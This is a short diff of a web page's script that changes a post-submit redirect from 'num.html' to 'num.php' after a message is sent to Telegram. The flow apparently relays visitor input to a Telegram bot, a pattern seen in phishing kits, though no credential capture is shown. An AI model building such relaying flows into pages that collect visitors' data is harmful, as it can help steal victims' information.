@@ -466,7 +466,7 @@ a:-webkit-any-link {
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        window.location.href = 'num.html';
+                        window.location.href = 'num.php';
                     } else {
                         console.error('Erreur lors de l\'envoi du message à Telegram.');
                     }
